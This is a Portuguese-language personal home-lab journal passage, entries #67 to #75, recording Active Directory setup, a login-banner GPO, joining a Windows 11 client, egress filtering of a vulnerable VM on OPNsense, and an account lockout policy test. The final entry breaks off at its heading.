Instalar o Active Directory Domain Services no Windows Server e promover a Controlador de Domínio, dando início ao bloco de Active Directory da Fase 5.

---

## Entrada #67 — Instalação do Active Directory Domain Services e promoção do Windows Server a Controlador de Domínio (lab.local)
**Data/hora:** 2026-08-24
**Máquinas ligadas:** Windows Server

### Objetivo / Propósito
Instalar o papel (role) Active Directory Domain Services (AD DS) no Windows Server e promovê-lo a Controlador de Domínio, criando o domínio `lab.local` — o bloco central da Fase 5, depois de resolvida a rede na Entrada #66.

### Ação executada
1. Instalado o papel AD DS com `Install-WindowsFeature -Name AD-Domain-Services -IncludeManagementTools`. Concluído com sucesso, sem necessidade de reiniciar nesta fase.
2. Escolhido o nome de domínio `lab.local` — convenção comum para domínios de laboratório/teste, com o sufixo `.local` a evitar qualquer conflito com domínios reais da internet.
3. Executado `Install-ADDSForest -DomainName "lab.local" -InstallDNS`, que promove o servidor a Controlador de Domínio de uma floresta (forest) nova e instala o serviço de DNS localmente (necessário para o funcionamento do AD).
4. Definida interativamente a palavra-passe de Diretório de Restauro de Serviços (DSRM — Directory Services Restore Mode), uma palavra-passe separada de emergência usada apenas para recuperar o AD em modo de manutenção, não a palavra-passe normal de login.
5. Confirmado o aviso de reinício ("The target server will be configured as a domain controller and restarted when this operation is complete") e aceite. A VM reiniciou automaticamente para concluir a promoção.
6. Após o reinício, verificado o resultado com `Get-ADDomain` e `Get-NetIPConfiguration`.

### Resultado
`Get-ADDomain` confirmou a criação do domínio: `DNSRoot: lab.local`, `NetBIOSName: LAB` (o nome curto do domínio, usado em formatos como `LAB\Administrator`), `Forest: lab.local`, com o servidor `WIN-54OBK8B48L5.lab.local` (hostname gerado automaticamente) a deter todas as FSMO roles (PDC Emulator, RID Master, Infrastructure Master) — natural, por ser o único Controlador de Domínio existente.

`Get-NetIPConfiguration` mostrou o DNS do próprio servidor agora a apontar para si mesmo (`::1` / `127.0.0.1`), em vez do OPNsense (`192.168.10.254`, usado temporariamente na Entrada #66).

### Deduções e raciocínio
O DNS a passar a apontar para o próprio servidor não é um resíduo mal corrigido — é o comportamento esperado e correto de um Controlador de Domínio instalado com `-InstallDNS`: o AD depende do seu próprio serviço de DNS para localizar controladores de domínio e outros serviços (via registos SRV), por isso o servidor tem de se usar a si mesmo como referência primária. Consequência prática a ter em conta: sem um forwarder configurado, este servidor deixa de conseguir resolver nomes fora do domínio (como a internet) — não bloqueia o que já foi feito, mas é o próximo ajuste lógico antes de avançar para OUs e utilizadores.

### Consigo explicar isto a alguém?
Sim — por palavras próprias: "instalei o papel de Active Directory e promovi o servidor a controlador de um domínio novo, chamado lab.local; agora ele gere a sua própria identidade de rede (DNS) em vez de depender do router."

### Como nos podemos defender
Não aplicável no sentido ofensivo/defensivo — é construção de infraestrutura. Nota de segurança a reter para mais tarde: a palavra-passe de DSRM é uma credencial sensível (dá acesso de recuperação total ao AD) e deve ser tratada com o mesmo cuidado que uma palavra-passe de administrador, nunca partilhada ou registada em texto simples fora de um cofre de credenciais.

### Domínios relacionados
Security+ D3 (Arquitetura de Segurança — Active Directory, serviços de diretório), CEH D3 (Reconhecimento de rede — AD como alvo comum), A+ Core 1 D2 (Redes — DNS, resolução de nomes).

### Próximos passos
Configurar um forwarder de DNS no Windows Server (a apontar para o OPNsense) para restaurar a resolução de nomes fora do domínio, e depois criar a estrutura inicial de OUs (Organizational Units) e uma conta de utilizador de teste.

---

## Entrada #68 — Confirmação do forwarder de DNS e criação da estrutura inicial de OUs e utilizador de teste no Active Directory
**Data/hora:** 2026-08-24
**Máquinas ligadas:** Windows Server

### Objetivo / Propósito
Fechar a resolução de nomes fora do domínio (deixada pendente na Entrada #67) e dar o primeiro passo prático dentro do Active Directory: criar uma estrutura organizacional de OUs e uma conta de utilizador de teste.

### Ação executada
1. Corrido `Add-DnsServerForwarder -IPAddress 192.168.10.254` — devolveu o aviso "already configured as forwarder", porque o DNS do servidor já apontava para o OPNsense antes da promoção a Controlador de Domínio (Entrada #66), e essa referência foi automaticamente importada como forwarder ao instalar o serviço de DNS local. Confirmado com `Get-DnsServerForwarder` e testado com `Resolve-DnsName google.com`, que devolveu IPs válidos (A e AAAA) sem erro — resolução de nomes internos e externos ambas a funcionar.
2. Criada uma estrutura de OUs (Organizational Units) dedicada ao lab, em vez de usar os contentores por defeito do Windows (`Users`/`Computers`): uma OU de topo `Lab`, com três sub-OUs — `Utilizadores`, `Computadores`, `Servidores`.
3. Criada uma conta de utilizador de teste (`New-ADUser`), com nome `Utilizador Teste` (SamAccountName `uteste`, UPN `uteste@lab.local`), dentro da OU `Utilizadores`, com password definida via `SecureString` e `-ChangePasswordAtLogon $true` (obriga a trocar a password no primeiro login).

### Resultado
`Get-ADOrganizationalUnit -Filter *` confirmou as quatro OUs esperadas (`Domain Controllers` — criada pelo Windows por defeito — mais `Lab`, `Utilizadores`, `Computadores`, `Servidores`, estas três aninhadas dentro de `Lab`). `Get-ADUser -Identity uteste` confirmou a conta criada, ativa (`Enabled: True`), no caminho correto (`CN=Utilizador Teste,OU=Utilizadores,OU=Lab,DC=lab,DC=local`).

### Deduções e raciocínio
Repetiu-se, pela segunda vez nesta fase, o hábito de colar um bloco de comandos duas vezes (já visto na Entrada #66, com os comandos de rede) — a primeira execução das quatro OUs teve sucesso silencioso (comportamento normal do PowerShell para estes cmdlets), e uma segunda colagem do mesmo bloco produziu erros "already in use", que na verdade confirmam indiretamente que a primeira execução funcionou. Não houve dano, mas vale a pena reforçar: quando um comando PowerShell não devolve nada, isso normalmente significa sucesso — mas em caso de dúvida, confirmar sempre com um comando de leitura (`Get-*`) em vez de assumir ou repetir o comando de escrita.

A escolha de uma OU de topo dedicada (`Lab`) em vez dos contentores por defeito do Windows é uma prática comum em ambientes reais: mantém os objetos geridos separados dos objetos de sistema, e permite aplicar GPOs (políticas de grupo) a um subconjunto específico do domínio no futuro, sem afetar toda a floresta.

### Consigo explicar isto a alguém?
Sim — por palavras próprias: "criei pastas organizacionais (OUs) dentro do Active Directory para separar utilizadores, computadores e servidores, e depois criei uma conta de utilizador de teste dentro dessa estrutura, para começar a praticar a gestão de contas no domínio."

### Como nos podemos defender
Não aplicável no sentido ofensivo/defensivo — é construção de infraestrutura. Lição transferível: a organização de OUs não é só estética — é a base sobre a qual assentam depois as políticas de segurança (GPOs) e a delegação de permissões administrativas; uma estrutura mal pensada logo no início complica a aplicação de políticas mais tarde.

### Domínios relacionados
Security+ D3 (Arquitetura de Segurança — Active Directory, gestão de identidade), A+ Core 2 D1 (Sistemas Operativos — administração de utilizadores e permissões).

### Próximos passos
Definir a próxima etapa do bloco de Active Directory da Fase 5 — por exemplo, criar uma primeira Política de Grupo (GPO) simples e aplicá-la à OU `Utilizadores`, ou avançar para o hardening do OPNsense antes de voltar ao AD.

---

## Entrada #69 — Criação e ligação da primeira Política de Grupo (GPO) à OU Utilizadores
**Data/hora:** 2026-08-24
**Máquinas ligadas:** Windows Server

### Objetivo / Propósito
Dar o primeiro passo em Políticas de Grupo (GPOs) dentro do Active Directory: criar uma GPO simples e didática (aviso legal de login) e ligá-la à OU `Utilizadores`, preparando o terreno para, numa sessão futura, editar o seu conteúdo e testá-la com uma máquina cliente ligada ao domínio.

### Ação executada
1. Criada a GPO `Aviso-Login-Utilizadores` com `New-GPO`, pensada para mostrar uma mensagem de aviso legal antes do login — um requisito comum em normas de conformidade (ISO 27001, NIS2).
2. Ligada essa GPO à OU `Utilizadores,OU=Lab,DC=lab,DC=local` com `New-GPLink`.
3. Confirmado o resultado com `Get-GPO -Name "Aviso-Login-Utilizadores"` (GPO existe, `GpoStatus: AllSettingsEnabled`) e `Get-GPInheritance -Target "OU=Utilizadores,OU=Lab,DC=lab,DC=local"` (a GPO aparece em `GpoLinks`, junto com a `Default Domain Policy` herdada do domínio).

### Resultado
GPO criada e corretamente ligada à OU `Utilizadores`, ainda sem conteúdo definido (settings vazios — `AD Version: 0`). Fica pronta para edição numa sessão futura.

### Deduções e raciocínio
Repetiu-se pela terceira vez nesta fase o mesmo padrão de colar um bloco de comandos duas vezes (já visto nas Entradas #66 e #68) — a primeira execução de `New-GPO`/`New-GPLink` teve sucesso silencioso, e a segunda colagem produziu erros "already exists"/"already linked", que confirmam indiretamente o sucesso da primeira. Padrão agora bem estabelecido e já não motivo de preocupação, mas vale a pena, no futuro, colar os comandos um de cada vez para evitar a confusão inicial.

Nota técnica importante para a continuação: editar o conteúdo de uma GPO (o texto do aviso propriamente dito) não tem, ao contrário dos passos anteriores desta fase, um equivalente prático em PowerShell — faz-se pela consola gráfica de Gestão de Políticas de Grupo (GPMC), que é a forma normal de o fazer mesmo em ambientes profissionais, não uma limitação deste lab. Além disso, para ver o efeito da GPO em ação, é necessário ter uma máquina cliente (ex.: Windows 11) já ligada ao domínio `lab.local` — isso ainda não foi feito, por isso ficou identificado como o passo seguinte antes de a GPO poder ser testada.

### Consigo explicar isto a alguém?
Sim — por palavras próprias: "criei uma Política de Grupo vazia e liguei-a à pasta de utilizadores do domínio; falta agora definir o que ela faz (o aviso de login) e ter um computador ligado ao domínio para conseguir ver o efeito."

### Como nos podemos defender
Não aplicável no sentido ofensivo/defensivo — é construção de infraestrutura. Lição transferível: um aviso legal de login é uma medida de conformidade real e barata de implementar (não impede um ataque, mas estabelece formalmente que o acesso não autorizado é proibido, o que tem valor legal/processual em muitas normas).

### Domínios relacionados
Security+ D3 (Arquitetura de Segurança — Políticas de Grupo), ISO/IEC 27001 (A.5.10 — uso aceitável dos ativos), NIS2 (obrigações de governação e sensibilização).

### Próximos passos
Numa sessão futura: editar o conteúdo da GPO via GPMC (mensagem de aviso de login), juntar o Windows 11 ao domínio `lab.local`, e confirmar visualmente o aviso a aparecer no ecrã de login dessa máquina.

---

## Entrada #70 — Correção do âmbito da GPO (Utilizadores → Computadores) e definição do conteúdo do aviso de login via GPMC
**Data/hora:** 2026-08-24
**Máquinas ligadas:** Windows Server

### Objetivo / Propósito
Corrigir um erro de conceção identificado antes de perder trabalho, e completar o conteúdo da GPO criada na Entrada #69.

### Ação executada
1. Identificado que a definição pretendida ("Interactive logon: Message title/text") vive em `Computer Configuration`, ou seja, aplica-se a objetos do tipo computador — mas a GPO estava ligada à OU `Utilizadores`, que só contém contas de utilizador. Ligada a essa OU, a política nunca teria efeito nenhum, por não existir nenhum objeto computador a apanhá-la.
2. Corrigida a ligação: `Remove-GPLink` da OU `Utilizadores`, seguido de `New-GPLink` para a OU `Computadores` (ambas dentro de `OU=Lab`). Desta vez os dois comandos foram corridos um de cada vez (não colados em bloco), e ambos devolveram output visível de sucesso — sem o efeito "silencioso" das vezes anteriores.
3. Editado o conteúdo da GPO via GPMC (`gpmc.msc` → `Forest: lab.local` → `Domains` → `lab.local` → `Lab` → `Computadores` → botão direito na GPO → `Edit`): em `Computer Configuration → Policies → Windows Settings → Security Settings → Local Policies → Security Options`, definidas as duas políticas `Interactive logon: Message title for users attempting to log on` (título: "Aviso Legal — Laboratório de Cibersegurança") e `Interactive logon: Message text for users attempting to log on` (texto de aviso legal de acesso não autorizado).
4. Confirmado com `Get-GPO -Name "Aviso-Login-Utilizadores"` que o `ComputerVersion` passou de `AD Version: 0, SysVol Version: 0` para `AD Version: 10, SysVol Version: 10` — prova de que o conteúdo foi gravado (as políticas de GPMC não têm um botão "Guardar" explícito; a gravação é automática ao fechar cada caixa de diálogo com OK).

### Resultado
GPO `Aviso-Login-Utilizadores` corretamente ligada à OU `Computadores`, com conteúdo definido e confirmado. Falta apenas um computador membro do domínio, dentro dessa OU, para ver o efeito prático.

### Deduções e raciocínio
Esta foi uma correção proativa (identificada antes de gastar tempo a testar algo que nunca funcionaria) do tipo de erro conceptual mais comum em GPOs: confundir o âmbito de aplicação (a OU onde a GPO está ligada, que determina *que objetos* a recebem) com a secção da política (`Computer Configuration` vs. `User Configuration`, que determina *que tipo* de objeto a aplica). As duas têm de estar alinhadas — uma definição de computador ligada a uma OU só de utilizadores nunca produz efeito nenhum, e vice-versa. É um erro real e frequente mesmo em ambientes profissionais, não um exagero pedagógico deste lab.

### Consigo explicar isto a alguém?
Sim — por palavras próprias: "uma GPO só se aplica aos objetos do tipo certo (computador ou utilizador) que estejam dentro da OU a que está ligada; tinha ligado a uma OU de utilizadores uma definição que só se aplica a computadores, por isso mudei a ligação para a OU de computadores."

### Como nos podemos defender
Não aplicável no sentido ofensivo/defensivo — é construção de infraestrutura. Lição transversal de auditoria de segurança: uma política de conformidade "existir" no papel (a GPO criada e com conteúdo) não significa que produza efeito — é preciso confirmar sempre o âmbito real de aplicação, não só a existência da regra.

### Domínios relacionados
Security+ D3 (Arquitetura de Segurança — Políticas de Grupo, âmbito de aplicação), ISO/IEC 27001 (A.5.10 — uso aceitável dos ativos; A.8.9 — gestão de configuração).

### Próximos passos
Juntar o Windows 11 ao domínio `lab.local`, mover o seu objeto de computador para a OU `Computadores`, e confirmar visualmente o aviso de login a aparecer no ecrã dessa máquina.

---

## Entrada #71 — Windows 11 juntado ao domínio lab.local e aviso de login confirmado visualmente
**Data/hora:** 2026-08-24
**Máquinas ligadas:** Windows Server, Windows 11

### Objetivo / Propósito
Juntar o Windows 11 ao domínio `lab.local`, mover o seu objeto de computador para a OU `Computadores`, e confirmar visualmente que a GPO `Aviso-Login-Utilizadores` (Entradas #69-#70) produz efeito real — fechando o primeiro ciclo completo de GPO desta fase.

### Ação executada
1. No Windows 11, verificado com `ipconfig /all` que o IP estava correto (`192.168.10.100`, via DHCP) mas o DNS apontava para o OPNsense — corrigido com `Set-DnsClientServerAddress -InterfaceAlias "Ethernet 3" -ServerAddresses 192.168.10.10` e confirmado com `Resolve-DnsName lab.local`.
2. Tentado o join ao domínio via `Add-Computer -DomainName "lab.local" -Credential (Get-Credential) -Restart` — a caixa de diálogo do `Get-Credential` do PowerShell revelou-se instável nesta VM (disparava, de forma repetida e mesmo sem colar nada, uma caixa "Selecionar uma aplicação para abrir 'Add-Computer'" fora de contexto, possivelmente por interferência do software de acesso remoto instalado na VM). Contornado usando o método clássico gráfico: `sysdm.cpl` → separador "Nome do computador" → `Alterar` → domínio `lab.local`, com sucesso.
3. Autenticação (dois passos distintos): a sessão no Windows 11 foi iniciada com a conta local `pedro` (a habitual nesta VM); já as credenciais de administrador de domínio pedidas *durante o join* foram as da conta `administrator@lab.local`, escrita em formato UPN (`utilizador@dominio`) em vez de `DOMINIO\utilizador` — o formato UPN foi escolhido de propósito para evitar o problema de escrever `\` num teclado que não o estava a produzir corretamente.
4. Confirmado o join com `Get-ComputerInfo | Select-Object CsDomain,CsPartOfDomain` → `lab.local` / `True`.
5. No Windows Server, localizado o objeto de computador recém-criado (`Get-ADComputer`) — estava, como esperado, no contentor por defeito `CN=Computers`, não na OU `Computadores`. Movido com `Move-ADObject -Identity "CN=DESKTOP-78KHHRF,CN=Computers,DC=lab,DC=local" -TargetPath "OU=Computadores,OU=Lab,DC=lab,DC=local"`, confirmado com uma nova consulta `Get-ADComputer`.
6. No Windows 11, forçada a atualização de política com `gpupdate /force` (em vez de esperar pelo ciclo automático de 90 minutos), seguida de `Restart-Computer`.
7. Confirmado visualmente no ecrã de arranque: caixa preta com o título "Aviso Legal — Laboratório de Cibersegurança" e o texto definido, a bloquear o acesso ao ecrã de login até se clicar "OK".

### Resultado
Windows 11 corretamente juntado ao domínio, objeto de computador na OU certa, e GPO confirmada em produção — o ciclo completo "criar OU → criar GPO → definir conteúdo → aplicar a objeto certo → confirmar visualmente" ficou fechado com sucesso.

### Deduções e raciocínio
Dois problemas de processo (não de conceito) atrasaram este passo: o teclado da VM sem barra invertida a funcionar (contornado usando o formato UPN `utilizador@dominio` em vez de `DOMINIO\utilizador` — uma alternativa válida sempre disponível no Windows) e a instabilidade da caixa `Get-Credential` do PowerShell (contornada usando o caminho gráfico clássico `sysdm.cpl`, que é aliás a forma mais comum de fazer isto em ambientes reais, não uma solução de recurso inferior).

A necessidade de mover manualmente o objeto de computador para a OU correta reforça a lição já registada na Entrada #70: uma GPO só produz efeito nos objetos que estão dentro do âmbito onde está ligada — não basta a GPO existir e ter conteúdo, os objetos-alvo têm de estar fisicamente (na estrutura do AD) no sítio certo.

### Consigo explicar isto a alguém?
Sim — por palavras próprias: "juntei o computador Windows 11 ao domínio, movi-o para a pasta certa dentro do Active Directory, e depois forcei a atualização da política para não ter de esperar; o resultado foi ver mesmo o aviso a aparecer no ecrã antes do login, confirmando que todo o processo funcionou de ponta a ponta."

### Como nos podemos defender
Não aplicável no sentido ofensivo/defensivo — é construção de infraestrutura. Lição transversal: confirmar sempre o efeito final de uma política de segurança de forma visual/prática (não só pela existência da configuração) é a única forma de ter a certeza de que uma medida de conformidade realmente funciona.

### Domínios relacionados
Security+ D3 (Arquitetura de Segurança — Active Directory, Políticas de Grupo), A+ Core 2 D1 (Sistemas Operativos — administração de domínio, DNS de cliente), ISO/IEC 27001 (A.5.10 — uso aceitável dos ativos, evidenciado em produção).

### Próximos passos
Continuar a Fase 5: hardening do OPNsense (regras de firewall) e/ou instalação do Wazuh (SIEM/HIDS) nas máquinas do lab.

---

## Entrada #72 — Hardening do OPNsense: egress filtering no "Servidor Vulneravel" (bloqueio de acesso à internet)
**Data/hora:** 2026-08-24
**Máquinas ligadas:** OPNsense, Servidor Vulneravel

### Objetivo / Propósito
Iniciar o bloco de hardening do OPNsense na Fase 5, com uma medida concreta e de baixo risco: impedir que a VM "Servidor Vulneravel" (a única intencionalmente insegura do lab) tenha acesso à internet, mantendo o acesso à rede interna necessário para os exercícios já feitos.

### Ação executada
1. Levantamento do estado inicial do firewall (`Firewall` → `Rules` → `LAN`): só existiam as duas regras automáticas do OPNsense ("Default allow LAN to any", IPv4 e IPv6) — ou seja, sem filtragem nenhuma dentro da rede "Ciber".
2. Confirmado o IP atual do "Servidor Vulneravel" via `Services` → `ISC DHCPv4` → `Leases` (com "Show inactive" ativado, porque a VM estava desligada): `192.168.10.101`, MAC `00:0c:29:b4:8b:9c` — já existia uma reserva DHCP estática para este MAC, confirmando que o IP se mantém fixo.
3. Criadas duas regras de firewall na interface LAN, pela ordem correta (a regra mais específica primeiro, já que o OPNsense avalia por "first match"): (a) `Pass`, origem `192.168.10.101`, destino `192.168.10.0/24` — permite tráfego para a rede do lab; (b) `Block`, origem `192.168.10.101`, destino `any` — bloqueia tudo o resto (a internet).
4. **Primeira tentativa falhada**: depois de criar e reordenar as regras, o teste (`ping -c 3 8.8.8.8` a partir do Servidor Vulneravel) continuou a ter sucesso. Investigação em várias camadas:
   - Confirmado com `ip route` que a VM tinha **duas rotas por defeito empatadas** (`metric 100` em ambas): uma via `ens33` (rede "Ciber", através do OPNsense) e outra via `ens37`, uma segunda interface de rede ligada à rede NAT do próprio VMware Workstation (`192.168.203.0/24`), historicamente usada na Fase 4 para dar acesso à internet durante instalações de pacotes (`apt install vsftpd`, `mariadb-server`, `apache2`). O Linux escolheu essa rota, contornando completamente o OPNsense. Corrigido removendo essa segunda placa de rede nas definições da VM (VMware Workstation → VM Settings → Hardware).
   - Mesmo depois de corrigir a rota (só ficou `ens33`), o `ping` a `8.8.8.8` continuava a passar. Verificado `Firewall` → `Diagnostics` → `States` — sem estados antigos associados, descartando a hipótese de uma sessão antiga ainda ativa.
   - Ao inspecionar a regra de bloqueio em modo de edição, o campo `Source` aparecia como `any`, não `192.168.10.101` — a regra nunca tinha ficado configurada como pedido. Investigação revelou a causa: o campo `Source`/`Destination` do OPNsense funciona como uma caixa de etiquetas (tags) — o valor `any` já vem pré-preenchido como etiqueta antes de se escrever, e escrever um novo valor e premir Enter **adiciona** essa etiqueta ao lado do `any`, em vez de o substituir. Como a etiqueta `any` continuava lá, a regra continuava, na prática, a significar "qualquer origem". A regra de "permitir" tinha o mesmo problema, com `Destination` também preso em `any`.
5. Apagadas as duas regras mal configuradas e recriadas do zero, desta vez removendo explicitamente a etiqueta `any` (clicando no `×`) antes de gravar cada regra. Confirmado visualmente na lista de regras (colunas `Source`/`Destination`) que ficaram com os valores corretos, antes de aplicar as alterações.
6. Reteste final: `ping -c 3 192.168.10.254` → sucesso, 0% perda; `ping -c 3 8.8.8.8` → falha, 100% perda.

### Resultado
Egress filtering confirmado a funcionar: o "Servidor Vulneravel" mantém acesso total à rede do lab, mas fica sem qualquer via de acesso à internet — nem pela rede "Ciber" (bloqueado pela regra), nem por nenhuma rota alternativa (a segunda placa de rede foi removida).

### Deduções e raciocínio
Esta entrada tem três lições técnicas reais, todas do tipo "o que parece simples na teoria tem armadilhas na prática":

1. **Rotas concorrentes**: uma VM pode ter múltiplas interfaces de rede com rotas por defeito em conflito; regras de firewall só têm efeito no tráfego que realmente passa pela interface onde estão aplicadas — daí a importância de confirmar sempre `ip route` antes de assumir que uma regra "devia" estar a funcionar.
2. **Estado de firewalls stateful**: vale sempre a pena verificar a tabela de estados (`Diagnostics → States`) como hipótese de diagnóstico, mesmo que neste caso se tenha revelado não ser a causa — é uma ferramenta de descarte útil.
3. **Armadilhas de interface (UI)**: um campo que parece um simples campo de texto pode na realidade ser uma caixa de etiquetas com um valor pré-existente escondido (`any`), que só desaparece se for explicitamente removido. Isto é uma lição sobre **verificar sempre o resultado final através de uma vista independente** (neste caso, a lista de regras, que mostra o valor real guardado) em vez de confiar apenas no que se pensa ter escrito no formulário de edição.

O achado da segunda placa de rede (Fase 4, NAT do VMware) é também um lembrete de que configurações provisórias (feitas por necessidade temporária, como dar acesso à internet para instalar pacotes) precisam de ser revertidas quando deixam de ser necessárias — de outra forma tornam-se falhas de segurança esquecidas.

### Consigo explicar isto a alguém?
Sim — por palavras próprias: "criei duas regras no firewall para que a máquina vulnerável só possa falar com o resto do laboratório, não com a internet; tive de descobrir e corrigir dois problemas escondidos — uma segunda ligação de rede que contornava o firewall, e um campo do formulário que continuava a guardar 'qualquer origem' mesmo depois de eu escrever o IP certo."

### Como nos podemos defender
Isto É a defesa: egress filtering é uma técnica de segurança real e amplamente usada — limitar não só quem pode entrar numa máquina, mas também para onde essa máquina pode enviar tráfego, reduz o impacto se ela for comprometida (impede exfiltração de dados e contacto com servidores de comando e controlo externos). Lição adicional: nunca confiar cegamente que uma configuração de segurança "ficou aplicada" só porque o formulário foi submetido sem erro — confirmar sempre o efeito real, através de teste funcional.

### Domínios relacionados
Security+ D3 (Arquitetura de Segurança — segmentação de rede, egress filtering), Security+ D4 (Operações de Segurança — firewalls stateful, diagnóstico), CEH D2 (Reconhecimento e Scanning — perspetiva do atacante sobre superfícies de saída), NIS2 (medidas técnicas de gestão de risco).

### Próximos passos
Continuar o hardening do OPNsense (avaliar outras regras, considerar Suricata como IDS) e/ou avançar para a instalação do Wazuh (SIEM/HIDS).

---

## Entrada #73 — Dificuldades de processo da sessão de hoje (Fase 5): um balanço honesto
**Data/hora:** 2026-08-24
**Máquinas ligadas:** Windows Server, Windows 11, OPNsense

### Objetivo / Propósito
Registar, de forma honesta, as dificuldades práticas e de processo desta sessão longa de Fase 5 — não só o que funcionou, mas o que custou tempo e paciência a resolver, seguindo o mesmo princípio já aplicado na Fase 4 (Entradas #57-#65): documentar o real, não uma versão polida.

### Ação executada / dificuldades encontradas
1. **Teclado sem barra invertida (`\`) a funcionar na VM Windows 11** — impediu escrever credenciais no formato `DOMINIO\utilizador`. Contornado usando o formato alternativo UPN (`utilizador@dominio`), que existe precisamente para estes casos.
2. **Bug de sincronização do clipboard do VMware** (já referido antes com o Kali) reapareceu de forma intermitente no Windows 11 — colar texto por vezes reintroduzia conteúdo antigo, ou disparava ações erradas fora da janela pretendida (como a caixa "Selecionar uma aplicação para abrir 'Add-Computer'").
3. **Instabilidade da caixa `Get-Credential` do PowerShell** ao tentar juntar o Windows 11 ao domínio — disparava repetidamente uma ação de sistema fora de contexto, mesmo sem colar nada. Contornado usando o caminho gráfico clássico (`sysdm.cpl`) em vez do comando PowerShell.
4. **Campo Source/Destination do OPNsense como caixa de etiquetas** — o valor `any` pré-existente não é substituído ao escrever um novo valor, tem de ser removido explicitamente. Isto gerou duas regras de firewall mal configuradas à primeira tentativa, e uma boa parte do tempo desta sessão foi gasta a diagnosticar por que razão regras "aparentemente corretas" não tinham efeito nenhum.
5. **Fadiga acumulada de repetição gráfica** — ao longo da sessão, a quantidade de passos por interface gráfica (GPMC, OPNsense, System Properties) foi maior do que o habitual neste projeto (que privilegia o terminal), e a soma de pequenos problemas técnicos foi desgastante. Isto é uma dificuldade real e válida de registar, não um sinal de falha — sessões que envolvem muita configuração de sistemas via GUI, em vez de comandos determinísticos, são objetivamente mais sujeitas a este tipo de atrito.

### Resultado
Apesar das dificuldades, todos os objetivos técnicos planeados para a sessão foram alcançados (AD DS, GPO funcional, egress filtering confirmado) — mas o caminho até lá foi mais longo e mais frustrante do que o necessário, por razões maioritariamente de ferramentas/interface, não de compreensão dos conceitos.

### Deduções e raciocínio
Vale a pena reter, para sessões futuras: quando o trabalho envolve várias interfaces gráficas empilhadas (GPMC dentro do Windows Server, formulários do OPNsense, caixas de diálogo do Windows), a probabilidade de pequenas falhas de interface acumuladas sobe consideravelmente — e a paciência é um recurso finito que se gasta mais depressa nesse tipo de sessão do que numa sessão de comandos de terminal, onde o feedback é mais direto e menos ambíguo. Não é falta de capacidade técnica; é simplesmente um tipo de trabalho mais desgastante.

### Consigo explicar isto a alguém?
Sim — por palavras próprias: "hoje grande parte do tempo não foi gasto a aprender conceitos novos, mas a lutar contra problemas de interface e de ambiente (teclado, clipboard, formulários enganadores) — o que é frustrante, mas também é uma parte real e honesta do trabalho técnico do dia a dia, que vale a pena documentar em vez de esconder."

### Como nos podemos defender
Não aplicável no sentido ofensivo/defensivo. Lição de processo transversal: confirmar sempre o resultado final através de uma vista independente (a lista, não o formulário de edição) é uma prática que teria poupado tempo em pelo menos dois destes casos.

### Domínios relacionados
Não aplicável a domínios técnicos de certificação — esta entrada é sobre processo e metodologia de trabalho, não sobre conteúdo de segurança.

### Próximos passos
Nenhum específico — esta entrada é só o balanço honesto do dia, tal como já foi feito na Fase 4.

---

## Entrada #74 — Política de bloqueio de conta (Account Lockout Policy) configurada e testada com sucesso: fecho do bloco de Active Directory
**Data/hora:** 2026-08-24
**Máquinas ligadas:** Windows Server, Windows 11

### Objetivo / Propósito
Fechar o bloco de Active Directory da Fase 5 com uma medida de defesa concreta, ligando diretamente à Fase 2 (força bruta contra logins do DVWA): configurar uma política de bloqueio de conta ao nível do domínio, e confirmar na prática que bloqueia tentativas repetidas de login falhado.

### Ação executada
1. Editada a `Default Domain Policy` (a política aplicada por defeito a todo o domínio, sem necessidade de criar uma nova GPO), via `gpmc.msc` → `Computer Configuration` → `Policies` → `Windows Settings` → `Security Settings` → `Account Policies` → `Account Lockout Policy`.
2. Definidos três valores: `Account lockout threshold` = 5 tentativas falhadas; `Account lockout duration` = 30 minutos; `Reset account lockout counter after` = 30 minutos (os dois últimos preenchidos automaticamente pelo Windows como sugestão ao definir o primeiro).
3. Confirmado com `Get-GPO -Name "Default Domain Policy"` que o `ComputerVersion` subiu (de um valor anterior para `13`), confirmando a gravação.
4. Teste prático a partir do Windows 11: login com a conta `LAB\uteste` e password propositadamente errada, repetido várias vezes. As primeiras tentativas mostraram o erro normal de credenciais inválidas; a partir de determinado ponto, o Windows 11 começou a mostrar "Credenciais inválidas, a atrasar a próxima tentativa..." — uma proteção própria do cliente Windows (limitação de tentativas rápidas), distinta da política de domínio.
5. Confirmação definitiva feita do lado do Windows Server (não do cliente): `Get-ADUser -Identity uteste -Properties LockedOut` → `LockedOut : True`.

### Resultado
Política de bloqueio de conta configurada e confirmada a funcionar de facto — a conta `uteste` ficou bloqueada no Active Directory depois de várias tentativas de login falhadas, tal como definido.

### Deduções e raciocínio
Vale a pena distinguir dois mecanismos de defesa diferentes que apareceram ao mesmo tempo neste teste: a mensagem "a atrasar a próxima tentativa" no Windows 11 é uma proteção do próprio sistema operativo cliente (introduzida em versões recentes do Windows para atrasar tentativas rápidas de login, independentemente de haver ou não Active Directory envolvido); o bloqueio real e confirmado (`LockedOut: True`) é a política de domínio que configurámos, e é essa que teria impedido de facto um ataque de força bruta como o praticado na Fase 2. É um bom exemplo de como a mesma situação pode ter várias camadas de defesa sobrepostas, cada uma com origem e âmbito diferentes — e por isso a confirmação definitiva foi sempre procurada na fonte de verdade (o Active Directory), não no sintoma visível no ecrã do cliente.

Com esta entrada, o bloco de Active Directory da Fase 5 fica considerado concluído: domínio criado, DNS e OUs organizadas, utilizador de teste, GPO de aviso de login funcional, e agora política de bloqueio de conta testada.

### Consigo explicar isto a alguém?
Sim — por palavras próprias: "configurei uma regra no domínio que bloqueia automaticamente uma conta depois de 5 tentativas de login erradas, e confirmei que funciona mesmo, tentando entrar de propósito com a password errada várias vezes até a conta ficar mesmo bloqueada."

### Como nos podemos defender
Esta É a defesa: uma política de bloqueio de conta é uma das medidas mais diretas e eficazes contra ataques de força bruta e password spraying — sem ela, um atacante pode tentar milhares de passwords sem consequência; com ela, cada conta fica automaticamente protegida ao fim de poucas tentativas. É também a razão pela qual o valor escolhido (5 tentativas) é um equilíbrio comum entre segurança e usabilidade (um limite demasiado baixo causa bloqueios acidentais frequentes por erros de digitação legítimos).

### Domínios relacionados
Security+ D3 (Arquitetura de Segurança — políticas de conta), Security+ D4 (Operações — resposta a tentativas de acesso não autorizado), CEH D3 (System Hacking — defesas contra força bruta), ligação direta à Fase 2 (Entradas de força bruta contra o DVWA).

### Próximos passos
Desbloquear a conta `uteste` (boa prática de administração) e avançar para o segundo bloco pendente da Fase 5: continuar o hardening do OPNsense e/ou iniciar o Wazuh (SIEM/HIDS).

---

## Entrada #75 — Ativação do Suricata (IDS) no OPNsense: dificuldades reais no processo, antes do resultado final
**Data/hora:** 2026-08-25
**Máquinas ligadas:** OPNsense, Kali Linux (como posto de gestão via browser)

### Objetivo / Propósito
